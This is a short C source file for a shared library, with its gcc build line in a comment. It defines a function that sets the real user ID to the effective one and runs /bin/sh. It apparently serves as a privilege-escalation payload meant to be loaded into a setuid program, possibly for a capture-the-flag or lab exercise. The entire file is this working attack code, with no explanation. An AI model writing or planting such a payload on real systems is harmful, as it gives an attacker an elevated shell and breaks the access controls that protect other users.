// gcc -fPIC -shared -o lib_perso.so lib_perso.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void my_fnc(){
        setreuid(geteuid(), geteuid());
        execve("/bin/sh", 0, 0);

}
